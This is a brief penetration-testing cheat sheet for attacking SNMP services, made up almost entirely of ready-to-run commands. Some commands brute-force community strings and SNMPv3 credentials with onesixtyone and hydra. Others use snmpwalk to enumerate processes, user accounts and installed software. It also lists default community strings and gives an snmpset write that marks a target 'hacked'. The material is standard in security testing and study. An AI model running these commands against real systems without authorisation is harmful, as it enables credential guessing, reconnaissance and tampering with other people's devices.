# SNMP Attacks

## 1. SNMP Enumeration
```bash
# Community string brute force
onesixtyone -c /usr/share/wordlists/snmp.txt target
# snmpwalk
snmpwalk -v2c -c public target
snmpwalk -v2c -c public target 1.3.6.1.2.1.1
# System info
snmpwalk -v2c -c public target 1.3.6.1.2.1.1.1
# Running processes
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.4.2.1.2
# User accounts
snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.2.25
# Software installed
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.6.3.1.2
```

## 2. Common Community Strings
```
public
private
community
manager
admin
secret
```

## 3. SNMPv3
```bash
# Brute force
hydra -l user -P /usr/share/wordlists/rockyou.txt snmp://target
# With auth
snmpwalk -v3 -u user -l authPriv -a SHA -A password -x AES -X password target
```

## 4. SNMP Write Access
```bash
# If write community string found
snmpset -v2c -c private target 1.3.6.1.4.1.77.1.2.25.1.1.1.2 s "hacked"
```

## Tools
```bash
# snmpwalk
# snmpget
# snmpset
# onesixtyone
# snmp-check
# snmpbrute
```
